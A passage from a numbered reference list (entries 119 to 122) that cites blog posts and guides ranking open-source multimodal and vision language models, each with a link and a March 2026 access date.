> 119. Multimodal AI: The Best Open-Source Vision Language Models in 2026 - BentoML, accessed on March 25, 2026, [https://www.bentoml.com/blog/multimodal-ai-a-guide-to-open-source-vision-language-models](https://www.bentoml.com/blog/multimodal-ai-a-guide-to-open-source-vision-language-models)  
> 120. 10 Best Open-Source LLM Models (2025 Updated): Llama 4, Qwen 3 and DeepSeek R1, accessed on March 25, 2026, [https://huggingface.co/blog/daya-shankar/open-source-llms](https://huggingface.co/blog/daya-shankar/open-source-llms)  
> 121. Ultimate Guide - The Best Open Source Multimodal Models in 2026 - SiliconFlow, accessed on March 25, 2026, [https://www.siliconflow.com/articles/en/best-open-source-multimodal-models-2025](https://www.siliconflow.com/articles/en/best-open-source-multimodal-models-2025)  
> 122. Best Open Source Multimodal Vision Models in 2025 - Koyeb, accessed on March 25, 2026, [https://www.koyeb.com/blog/best-multimodal-vision-models-in-2025](https://www.koyeb.com/blog/best-multimodal-vision-models-in-2025)
